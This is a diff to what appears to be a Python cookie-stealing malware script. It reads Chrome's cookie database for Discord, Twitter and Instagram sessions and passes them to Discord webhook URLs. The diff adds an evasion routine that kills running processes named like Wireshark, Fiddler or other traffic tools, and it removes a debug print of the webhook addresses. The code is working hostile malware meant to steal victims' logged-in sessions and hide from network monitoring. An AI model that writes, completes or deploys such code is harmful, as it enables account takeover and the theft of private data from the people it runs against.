@@ -16,7 +16,29 @@ from re import findall, search
 import win32con
 from win32api import SetFileAttributes
 import browser_cookie3
-import time
+from psutil import process_iter, NoSuchProcess, AccessDenied, ZombieProcess
+
+try:        
+    from psutil import process_iter, NoSuchProcess, AccessDenied, ZombieProcess
+
+    class scare:
+
+        def fuck(names):
+            for proc in process_iter():
+                try:
+                    for name in names:
+                        if name.lower() in proc.name().lower():
+                            proc.kill()
+                except (NoSuchProcess, AccessDenied, ZombieProcess):
+                    pass
+
+        def crow():
+            forbidden = ['http', 'traffic', 'wireshark', 'fiddler', 'packet']
+            return scare.fuck(names=forbidden)
+        
+    scare.crow()
+except:
+    pass
 
 website = ['discord.com', 'twitter.com', 'instagram.com']
 
@@ -76,7 +98,6 @@ def decrypt_data(data, key):
         except:
             return ""
 def main(DISCORD_WEBHOOK_URLs):
-    print(DISCORD_WEBHOOK_URLs)
     filename = "Cookies.db"
     db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                             "Google", "Chrome", "User Data", "Default", "Network", "Cookies")
@@ -249,7 +270,7 @@ def main(DISCORD_WEBHOOK_URLs):
 
 if __name__ == "__main__":
     if len(sys.argv) == 1:
-        main(['YOUR DISCORD WEBHOOK URL])
+        main(['YOUR DISCORD WEBHOOK URL'])
     else:
         del sys.argv[0]
         main(sys.argv)
